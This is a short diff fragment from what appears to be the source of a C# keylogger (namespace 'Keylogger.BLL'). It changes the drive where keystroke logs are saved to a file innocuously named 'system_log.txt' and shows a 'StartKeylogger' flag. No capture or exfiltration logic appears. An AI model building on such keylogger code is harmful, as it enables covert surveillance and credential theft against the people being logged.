@@ -25,7 +25,7 @@ namespace Keylogger.BLL
             return st+".txt";
         }
 
-        public static Setting setting= new Setting(@"D:\system_log.txt", 200);
+        public static Setting setting= new Setting(@"E:\system_log.txt", 200);
 
         public static bool StartKeylogger=false;
 
